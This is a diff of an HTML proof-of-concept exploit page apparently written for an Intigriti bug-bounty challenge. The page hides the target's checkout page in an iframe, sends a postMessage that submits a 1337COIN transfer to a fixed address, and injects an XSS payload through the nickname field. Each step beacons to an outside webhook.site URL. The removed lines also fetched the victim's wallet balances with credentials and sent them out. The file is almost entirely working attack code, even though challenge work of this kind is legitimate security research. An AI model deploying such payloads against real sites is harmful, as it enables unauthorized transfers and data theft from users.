@@ -2,67 +2,47 @@
 <html>
 <head><title>PoC</title></head>
 <body>
-<h1>Testing...</h1>
+<h1>XSS PoC</h1>
 <script>
 (function() {
   const BASE = 'https://challenge-0126.intigriti.io';
-  const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
-  const xss = '<img src=x onerror="alert(\'gigawatz\');fetch(\'' + WEBHOOK + '/?xss=1\')">';
+  const WEBHOOK = 'https://webhook.site/fd042032-f1e9-404c-b9b1-8fb39614db44';
 
-  // Track
-  fetch(WEBHOOK + '/?step=1_start').catch(() => {});
+  // Simple image-based tracking (avoids CORS)
+  new Image().src = WEBHOOK + '/?step=1_start';
 
-  // Check wallets
-  fetch(BASE + '/api/wallets', {credentials:'include'})
-    .then(r => r.json())
-    .then(wallets => {
-      const w = wallets.find(x => x.currency === '1337COIN');
-      fetch(WEBHOOK + '/?step=2_wallets_' + wallets.length + '_1337=' + (w ? w.balance : 'none')).catch(() => {});
+  const xss = '<img src=x onerror="alert(\'gigawatz\');new Image().src=\'' + WEBHOOK + '/?xss=1\'">';
 
-      // Set profile
-      return fetch(BASE + '/api/profile', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        credentials: 'include',
-        body: JSON.stringify({nickname: xss})
-      });
-    })
-    .then(r => {
-      fetch(WEBHOOK + '/?step=3_profile_' + r.status).catch(() => {});
-      return r.text();
-    })
-    .then(() => {
-      // Create iframe
-      const iframe = document.createElement('iframe');
-      iframe.src = BASE + '/checkout.html?currency=1337COIN&price=1';
-      iframe.style.display = 'none';
-      document.body.appendChild(iframe);
+  // Skip direct API calls - use postMessage only
+  const iframe = document.createElement('iframe');
+  iframe.src = BASE + '/checkout.html?currency=1337COIN&price=1';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
 
-      iframe.onload = function() {
-        fetch(WEBHOOK + '/?step=4_loaded').catch(() => {});
+  iframe.onload = function() {
+    new Image().src = WEBHOOK + '/?step=2_loaded';
 
-        setTimeout(function() {
-          // Send message
-          iframe.contentWindow.postMessage({
-            type: 'submitTransaction',
-            transaction: {
-              toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
-              currency: '1337COIN',
-              amount: 1
-            }
-          }, '*');
+    setTimeout(function() {
+      // Send postMessage with XSS in nickname
+      iframe.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+          nickname: xss,
+          toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
+          currency: '1337COIN',
+          amount: 1
+        }
+      }, '*');
 
-          fetch(WEBHOOK + '/?step=5_sent').catch(() => {});
+      new Image().src = WEBHOOK + '/?step=3_sent';
 
-          // Redirect
-          setTimeout(function() {
-            fetch(WEBHOOK + '/?step=6_redirect').catch(() => {});
-            window.location = BASE + '/marketwatch.html';
-          }, 3000);
-        }, 2000);
-      };
-    })
-    .catch(e => fetch(WEBHOOK + '/?error=' + encodeURIComponent(e.message)).catch(() => {}));
+      // Redirect to marketwatch
+      setTimeout(function() {
+        new Image().src = WEBHOOK + '/?step=4_redirect';
+        window.location = BASE + '/marketwatch.html';
+      }, 4000);
+    }, 3000);
+  };
 })();
 </script>
 </body>
